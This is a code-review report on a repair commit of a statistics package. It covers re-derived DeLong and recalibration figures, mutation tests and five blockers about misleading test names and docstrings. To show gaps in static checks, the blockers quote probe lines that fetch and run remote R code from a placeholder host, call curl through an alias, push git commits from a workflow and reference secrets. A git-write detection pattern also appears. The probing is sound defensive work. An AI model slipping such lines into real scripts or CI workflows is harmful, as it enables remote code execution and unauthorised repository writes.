# Lane E - build day 12 (E12, the R captures) - lens 2, cold fresh attack, at `6928511` (repair 1; base `2328e86`; Monday 5 October 2026)

**FAIL. 5 blockers.**

Four blockers are sentences: a test name and a README sentence about the workflow test, a test name about the `capture.R` test, a docstring about the new status rule, and the repair test module's own docstring. Each one I falsified with a counter-example that I built and ran. The fifth is a surviving mutant in the gate the repairer counts as statistical. It reopens lens 1's FA-B1 class (a comparison reported as a skip, not a failure).

The statistics are right. I re-derived DeLong from the 1988 structural components, the paired z, p and difference interval, pROC's truncated Wald interval, and the joint and offset recalibration on `fixtures/f4_calibration.csv`, using numpy and my own code. The engine matched every figure to 2.2e-15 or better. The definitions the comparison pairs are like with like.

`capture.R` and the r-captures workflow have still never run. Gate 2 of section 10 is not met by measurement. Today F13 and F13b are `no_oracle_recorded`, and both reasons start `[unverified until captured]` (re-measured below).

Setup. Three detached worktrees under `scratchpad/lens-E12-r2-fresh-attack/`:
- `new` (`6928511`): the suite and the markers;
- `pw` (`6928511`): the probes and mutants;
- `old` (`2328e86`): the repair tests copied in.

Before any figure, `PYTHONPATH=<wt>/src python -c "import proofpack;print(proofpack.__file__)"` printed that worktree's own `src\proofpack\__init__.py`. Suite runs had `PROOFPACK_REQUIRE_DOCX=1`, `PYTHONIOENCODING=utf-8` and `PROOFPACK_TR39_FULL=.../confusables-18.0.0.txt`. Platform: Windows 11, Git Bash, CPython 3.14.6, numpy 2.5.1, scipy 1.18.1. I committed, pushed and installed nothing, and I did not install R. I read two public source files with WebFetch, as text: `xrobin/pROC` `R/delong.R` and `harrelfe/rms` `R/val.prob.s`, both on `master`.

One slip, and how I dealt with it. My first perturbation sweep wrote captures into `new/fixtures/r/` while the full suite was running in that same worktree. That run reads `7 failed, 2048 passed, 9 skipped`, and I discarded it. I deleted the files, moved all probing to `pw` and re-ran the suite clean (figures below).

## Blockers

| # | Blocker | Verbatim evidence | One-line repro |
|---|---|---|---|
| B1 | **The repair's rule "an unreadable file does not skip" has no test that fails when the rule is reversed. Under that mutant the test reports a skip.** Repair decision 2 says: "In the gates, an unreadable file never skips. The comparison then fails on it." The only test that feeds a gate an unreadable file is `tests/test_day12_r_captures.py::test_the_skip_reasons_are_the_typed_strings`, with `proc_asah.json` = `{"values": ` and the vectors absent. Its last call is `_f13_or_skip(...)`, so under the mutant that call raises the skip, and pytest reports the test SKIPPED, not FAILED. No test feeds the F13b gate an unreadable file at all. This is lens 1 FA-B1's class: with a capture present but unreadable, every comparison would read "not captured" as a skip. The main CI job does not fail on a skip. | Mutant M1: in `_gate`, `return caps, []` became `return caps, list(needs)`. `-m "day12 or fixture or ap3"` gave `304 passed, 9 skipped, 1751 deselected` (unmutated: `305 passed, 8 skipped`). The target test alone: `SKIPPED [1] tests\test_day12_r_captures.py:128: r_captures_not_captured: F13 (absent: fixtures/r/proc_asah.json, fixtures/r/asah_vectors.csv)`, `1 skipped in 0.43s`. Only the never-run workflow's `grep -q "SKIPPED"` would catch it. | in `tests/test_day12_r_captures.py` `_gate`, `return caps, []` -> `return caps, list(needs)`; `python -m pytest -q -rs tests/test_day12_r_captures.py::test_the_skip_reasons_are_the_typed_strings` |
| B2 | **FA-B3 reproduces with new mutants: the workflow test's name and the README sentence that describes it are false.** The test is `::test_the_workflow_declares_read_permissions_tag_pinned_actions_and_no_git_write_step`. `fixtures/r/README.md` says the file "names no secret, and has no step whose `run` calls `git push`, `git commit` or `gh`; that is what `tests/test_day12_r_captures.py::test_the_workflow_declares_read_permissions_tag_pinned_actions_and_no_git_write_step` inspects." What the test actually inspects: the substring `secrets.` and the regex `\bgit\s+(push\|commit\|tag\|merge\|rebase\|reset)\b\|\bgh\s+\w`. | Each mutant below went into a copy of the yml (with `d12.REPO` pointed at the copy), and the workflow test **passed** on each. W8: `run: Rscript fixtures/r/capture.R && git -C . add -A && git -C . commit -m c && git -C . push`. W9: `... && git -c user.name=x commit -am c`. W10: a step `env: TOKEN: ${{ secrets['GITHUB_TOKEN'] }}` (names a secret without `secrets.`). W11: a step `uses: stefanzweifel/git-auto-commit-action@v5` (a git write step, tag-pinned). Also W13, `services: db: image: postgres:latest`, passed (an image not pinned to a version; the name does not claim images). The committed workflow is fine. What is false is the description of the check. | plant `git -C . push` in the `capture` run line; run the workflow test (script `probe/static_mut.py`) |
| B3 | **RG-B2 reproduces with new lines: the `capture.R` test's name is false.** The name is `::test_capture_r_writes_fixtures_py_paths_and_calls_only_listed_packages_and_commands`. Its docstring rightly names `do.call`, run-time strings and `eval(parse())` as not inspected. The name still asserts "only listed ... commands". | Each line below was appended alone to a copy of `capture.R` (with `d12.COMMITTED` pointed at the copy), and the test **passed** on each. `sh <- system2; sh("curl", "https://example.invalid")` (runs curl through an alias). `x <- readLines("https://example.invalid/x")`. `source("https://example.invalid/x.R")` (fetches and runs remote code). `z <- jsonlite::fromJSON("https://example.invalid/x.json")`. `do.call("system2", list("curl", ...))`. The test killed `utils::download.file (...)` and `utils::install.packages("Hmisc")`. | append `sh <- system2; sh("curl", "https://example.invalid")` to a copy; run the test |
| B4 | **The new status rule's docstring is false: `present_compared_in_rows_f13_f13b` is printed when one row compared no value.** `fixtures.r_captures_status` docstring: "`R_CAPTURES_PRESENT` when both compared one or more values". The comment on `R_CAPTURES_PRESENT`: "when rows F13 and F13b each compared one or more values". The repair note's lane S line: "`present_compared_in_rows_f13_f13b` now means that both rows compared values". The code tests `n_values_compared > 0`, and `compare_row` sets that field to `len(values)`. That is the number of names tried, missing ones included. | Synthetic capture with `rms_val_prob_f4.json` `values` = `{}`. Output: `present_compared_in_rows_f13_f13b`, line `... row F13 matched, row F13b not_matched`. Row F13b: `not_matched 13 oracle value missing: glm joint (Intercept); oracle value missing: glm joint logit_p; ...`. All 13 have `abs_deviation` `None`, so zero values were compared. All values as strings, the RG-N6 carry: `present_compared...`, F13b `matched`. | `probe/status.py`, case "valprob values empty object" |
| B5 | **The repair test module's docstring says every test in it failed at `2328e86`. Two pass there.** `tests/test_e12_repair1.py` module docstring: "Every test here was run against ``2328e86`` in a detached worktree (``PYTHONPATH=<worktree>/src``) and failed there". The repair note itself reports "18 failed, 2 passed". | The file copied into `old` (`2328e86`; `proofpack.__file__` in `old`): `18 failed, 2 passed in 3.49s`. `PASSED tests/test_e12_repair1.py::test_fa_b3_control_the_committed_workflow_copied_passes`, `PASSED tests/test_e12_repair1.py::test_rg_b2_control_the_committed_capture_r_copied_passes`. | copy `tests/test_e12_repair1.py` into a `2328e86` worktree; `PYTHONPATH=<wt>/src python -m pytest -q -rA tests/test_e12_repair1.py` |

Repairs:
- **B1.** End the unreadable case with an assertion after the call: catch `pytest.skip.Exception` and fail. Add the same case for `_f13b_or_skip` with `rms_val_prob_f4.json` unreadable. M1 must then fail.
- **B2 and B3.** Rename the tests to what they inspect, for example `..._no_run_line_matching_git_write` and `..._no_listed_command_pattern`. Make the README say "the test inspects the substring `secrets.` and the `GIT_WRITE` pattern". Or extend the checks, planting W8-W11 and the alias line first.
- **B4.** Count only the values with a numeric deviation, or say "`n_values_compared` above 0 (names compared, missing values included)".
- **B5.** "failed there, except the two controls, which pass at both commits".

B1 touches the comparison gate, so under DEC-12 (i) its repair gets a fresh lens.

## Non-blocking (record and carry)

| # | Record | Evidence and one-line repro |
|---|---|---|
| N1 | **Mutant M10 survives: no test reads the status line when exactly one capture file is read and both rows are `no_oracle_recorded`.** The code as committed prints a correct line for that state. | M10 (`elif status == R_CAPTURES_NOT_CAPTURED:`, dropping `and not caps.present and not unreadable`): `305 passed, 8 skipped`. Under the mutant, with `proc_asah.json` alone, the line would read "no R capture is committed", which is FA-B2(c)'s false line. Today it reads `r-captures: r_captures_not_captured - read: fixtures/r/proc_asah.json; unreadable: none; absent: fixtures/r/rms_val_prob_f4.json, fixtures/r/asah_vectors.csv; row F13 no_oracle_recorded, row F13b no_oracle_recorded`. M9 (dropping `and not unreadable`) is equivalent: any unreadable file makes a row `not_matched`, so the status is never `not_captured` then. |
| N2 | **The new return keys are not pinned.** M13 (`"present": list(R_CAPTURE_FILES)`) and M14 (`"rows": {}`) each gave `305 passed, 8 skipped`. Lane S is told about both keys (DEC-43). | mutate those two lines; `-m "day12 or fixture or ap3"` |
| N3 | **`GIT_WRITE`'s `push` alternative is not pinned.** M15 (drop `push`) gave `305 passed, 8 skipped`, because W3 also carries `git commit`. | as above |
| N4 | **The status token says "not captured" when that is unknown or false.** With `proc_asah.json` alone read, the status is `r_captures_not_captured`. From an installed package it is also `r_captures_not_captured`. FA-N8 took that claim out of the reason for exactly this case. The printed line explains both states. | `probe/status.py` case "proc_asah.json alone"; `test_fa_n8_...` asserts `st["status"] == "r_captures_not_captured"` |
| N5 | **`R_CAPTURES_NOT_READ` opens "an installed package reads no R capture". An editable install is installed and does read them.** The clause that follows ("fixtures/r/ is read only when the package is <root>/src/proofpack ...") is exact. This machine's own `_editable_impl_proofpack.pth` is a counter-example to the opening words. | `fixtures.py` `R_CAPTURES_NOT_READ` |
| N6 | **The skip reasons are no longer exactly `R_CAPTURES_NOT_CAPTURED`.** They are `r_captures_not_captured: F13 (absent: ...)` and `r_captures_not_captured: F13b (absent: ...)`. My attack list asks for "exactly"; the brief asks for "a named reason". Repair decision 1 chose the prefix. | `-rs` output below |
| N7 | **Capture fields that are compared nowhere.** Moving each of these by +2e-6 or -2e-6, or deleting it, failed nothing: `s100b ci_delong_mid`, `ndka ci_delong_mid`, `val.prob Dxy`, `glm joint (Intercept) se`, `glm joint logit_p se`, `glm offset (Intercept) se`. The SEs and `Dxy` are left out by design, as the `F13B_NAMES` comment says; `ci_delong_mid` equals `auc`. This sits beside lens 1 FA-N1 (the name lists are not independent). | `probe/sweep.py` |
| N8 | **A capture's provenance is not checked.** A synthetic capture with `r_version_string` "R version 0.0.0 (synthetic, written by the test)" and "not a GitHub run" reads `matched`, with `oracle_source.unverified` `False` and `marking` `None`. That is build item 3 code, not the repair. A committed capture is reviewed by hand, but nothing in the code asks that it came from the workflow. | the synthetic capture in `pw/fixtures/r/`; `proofpack fixtures --offline --r-captures`: `matched 36 ... no oracle recorded 0`; then read the rows' `oracle_source` |
| N9 | **Two `[unverified]` notes on "which intercept" could cite a source now.** The `tests/test_day12_r_captures.py` docstring says "rms source not fetched", and the `F13B_NAMES` comment says "from memory". Two lenses have now read `val.prob.s` (master): `logit <- qlogis(p)`, `i <- ! is.infinite(logit)`, `f.recal <- lrm.fit(logit[i], y[i])`, and `f.recal$coef` named `"Intercept","Slope"`. That is the joint model. Keeping the mark is allowed, because master is not the version the snapshot installs. | WebFetch of `raw.githubusercontent.com/harrelfe/rms/master/R/val.prob.s` |
| N10 | **Lens 1's carried items stand as the repair note lists them.** FA-N1, N2, N3 (the workflow's own gates), N4 (pin by tag; Josh's call), N5, N6, N7 and N9; RG-N4, N5 and N6 (behaviour). I re-measured FA-N5 at `6928511`, with the synthetic capture present: `8 failed, 1989 passed, 1 skipped, 66 deselected` outside `day12`. These are the same 8 node ids the README's step 4 attributes to lens 1. | the synthetic capture in `pw/fixtures/r/`; `python -m pytest -q -m "not day12"` |

## What I could not break (re-measured, with figures)

**Suite and lint at `6928511`** (`new`, clean run):
- full suite: `2055 passed, 9 skipped in 254.54s`. The skips are `SKIPPED [3] tests\test_day12_r_captures.py:128: r_captures_not_captured: F13 (absent: fixtures/r/proc_asah.json, fixtures/r/asah_vectors.csv)`, `SKIPPED [5] tests\test_day12_r_captures.py:137: r_captures_not_captured: F13b (absent: fixtures/r/rms_val_prob_f4.json)` and `SKIPPED [1] tests\test_doctor_cli.py:57`;
- `ruff check .`: `All checks passed!`; `ruff format --check .`: `303 files already formatted`.

These are the repair note's figures.

**Markers against the note's "before" figures:**

| Marker | Now | Before |
|---|---|---|
| `day12` | `58 passed, 8 skipped` | `38 passed, 7 skipped` (`2328e86`) |
| `day11` | `144 passed` | the same |
| `day10` | `262 passed` | the same |
| `ap3` | `176 passed` | the same |
| `fixture` | `71 passed` | the same |

**The repair's regression tests at `2328e86`:** `18 failed, 2 passed`, as the note says (B5 is about the docstring only).

**The statistics, re-derived** (numpy and my own O(mn) psi sums: S10/(m-1), S01/(n-1), var = S10/m + S01/n):
- Seven seeded data sets with ties inside and across classes: N = 113, 30, 57, 200, 14, 80 and 41, with 41, 16, 29, 71, 6, 24 and 26 cases.
- Compared on each: `delong_variance`; `auroc_number`'s `delong_wald` bounds, truncated to [0, 1] as pROC's `ci_auc_delong` truncates (`ci[ci > 1] <- 1; ci[ci < 0] <- 0`, read); `paired_delong`'s z and p; and `f13_engine_values`'s z, variance, lower bound and paired `conf.int`.
- For the paired `conf.int` I used pROC's `d <- VR$theta - VS$theta` (roc1 minus roc2) and `d ± crit_z * sig` (read).
- Worst deviation: `2.1649348980190553e-15`.

**Recalibration, by my own Newton fit on F4:**
- Joint intercept `0.49977163424518545`, slope `1.1945124796435689`, SEs `0.59505562632563258` / `0.56174581467277207`.
- Offset intercept `0.45623046546120949`, SE `0.55368662585855599`.
- Brier `0.158755`, C `0.85416666666666663`.
- Every one of the 13 `F13B_NAMES` engine values is within 2.22e-16 of mine.
- The pairing: `val.prob Intercept` and `glm joint` go with the engine's joint `intercept`; `glm offset` goes with `intercept_large`. Like with like, consistent with rms's `lrm.fit(logit[i], y[i])` (read).

**Perturbation sweep.** I ran the eight comparison test functions in-process on the synthetic capture in `pw/fixtures/r/`, on every field of both captures in turn (29 fields).
- +2e-6, -2e-6, or the field deleted: every compared field failed one or more tests. Each failure was a failure, not a skip.
- +5e-7: every field passed except `var_delong` (relative 1e-6) and the four counts (exact). Both are stricter by design.
- `roc.test conf.int lo` +2e-6 or -2e-6: failed in the pytest. It is not in the report row, by design (`F13_OPTIONAL_NAMES`). +5e-7 passed; a sign-flipped interval failed both bounds.
- An F4 sha256 of `"f"*64`: fails `test_f13b_capture_recorded_the_sha256...` and the F13b report row. A wrong vectors sha256 fails the F13 equivalents.
- All files absent: all eight skip with the two typed reasons above.

**Mutants killed** (`-m "day12 or fixture or ap3"`, each `1 failed` under `-x`):
- M2: the F13b gate needs the vectors (FA-B1 reintroduced).
- M3: `all` -> `any` on `n_values_compared`.
- M4: `all` -> `any` on `no_oracle_recorded`.
- M5 and M6: the installed-package branch removed from `f13b_oracle` and from `f13_oracle`.
- M7: the installed-package line branch removed.
- M8: `absent` keeps the unreadable files.
- M11: the refusal always writes the argument `n_cases`.
- M12: the F13 gate needs `proc_asah.json` only.
- M16: the F13b gate never skips.

**Lens 1 blockers re-tried with lens 1's own inputs:**
- FA-B1 (vectors absent, slope +1e-3) gives three F13b FAILED; covered by `test_fa_b1_...`, which passes.
- FA-B2 (a), (b) and (c) print the lines the repair note quotes.
- W1, W1b, W2 and W3 fail the workflow test.
- RG-B2's three lines fail the `capture.R` test.
- RG-B1's sentence is gone.
- FA-B4: `clustered_number`'s six steps match the code's order. The suppressed return comes before the `ValueError`. `n_cases` comes from the argument only when the input has none.
- FA-N8: the installed-package reason.
- RG-N6: the comment is now true for `"NaN"`, `"NA"` and `"Inf"`.

**`capture.R`, line by line against the attack list:**
- `roc()` sets `levels = LEVELS, direction = DIRECTION` and `stopifnot`s them.
- `ci.auc(method = "delong")` is the truncated Wald interval (pROC source).
- `var` comes from pROC's namespace with `method = "delong"`.
- `roc.test(method = "delong", paired = TRUE)`.
- `val.prob(p, y, pl = FALSE)` is given probabilities; rms computes `qlogis(p)` itself.
- Every number and every vector value is written with `sprintf("%.17g")`.
- The F4 sha256 is taken on a temp copy written with `writeBin` from exactly the `readBin` bytes that `rawToChar` parses.

I found no blocker-class defect in the script.

**The workflow as committed:**
- Top-level `permissions: contents: read`; no job-level override.
- Triggers: `workflow_dispatch`, and `push` with paths. No `pull_request_target`.
- No `secrets` in any form.
- No writing step.
- Actions and the container are pinned by tag (N10 / FA-N4).

**With the synthetic capture present** (the compare job's state):
- `-m day12`: `66 passed`, 0 skipped.
- `proofpack fixtures --offline --r-captures`: exit 0, `matched 36, ... no oracle recorded 0`, `r-captures: present_compared_in_rows_f13_f13b - read: ...; unreadable: none; absent: none; row F13 matched, row F13b matched`.

**Absent (today):**
- `proofpack fixtures --offline --out DIR --r-captures`: exit 0, `rows 46: matched 34, not matched 0, no oracle recorded 2, ...`, and the `r-captures: r_captures_not_captured - no R capture is committed (...)` line, byte for byte as the note quotes it.
- F13 and F13b reasons start `[unverified until captured]`; `unverified` appears 37 times in the report.
- `r_capture_drift.py --committed fixtures/r --fresh fixtures/r`: exit 0, `no capture is committed; nothing to compare`.
- `git grep -i "verified against R\|matches pROC\|validated against R" 6928511` outside `handoffs/`: nothing.

## What I could not check

- Whether `capture.R` runs. R is not installed here and nothing was downloaded. Also unchecked: whether `rocker/r-ver:4.5.1` installs rms, whether `tools::sha256sum` exists in R 4.5.1, and whether pROC writes `conf.int` on a paired DeLong test.
- The aSAH data itself.
- `lrm.fit`'s default convergence against 1e-6.
- The pROC and rms versions the snapshot installs. The sources I read are `master`.
- Any workflow run on GitHub: `6928511` is not pushed, so neither job has run.
- PowerShell 5.1 figures: I ran every figure in Git Bash.

## Sentences I refused to write

- "The engine matches pROC and rms": nothing has been compared with R.
- "Gate 2 is met."
- "The workflow test proves the workflow cannot write or read a secret": B2.
- "An unreadable capture always fails the comparison": B1. The code does this today; the test that should pin it reports a skip under the reversed rule.
